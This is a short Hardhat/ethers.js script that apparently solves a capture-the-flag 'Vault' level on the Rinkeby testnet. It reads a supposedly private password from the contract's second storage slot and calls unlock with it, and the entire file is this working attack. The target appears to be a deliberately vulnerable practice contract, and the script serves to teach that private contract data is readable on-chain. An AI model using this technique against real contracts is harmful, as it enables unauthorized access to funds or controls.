const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x3a0d7f54E8F4d1da564E28989924f6BD72d07F7d'
const abi = [
    "function unlock(bytes32 _password) public",
    "function locked() public view returns (bool)"
]

async function hack(contract, signer) {
    // We know the password is in the second storage slot, so we can access it directly.
    const provider = ethers.getDefaultProvider('rinkeby');
    const pw = await provider.getStorageAt(contract.address, 1);
    console.log(`Uncovered the password! ${pw}`);

    const tx = await contract.unlock(pw);
    await tx.wait();

    const locked = await contract.locked();
    console.log(`Contract Locked? ${locked}`);
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})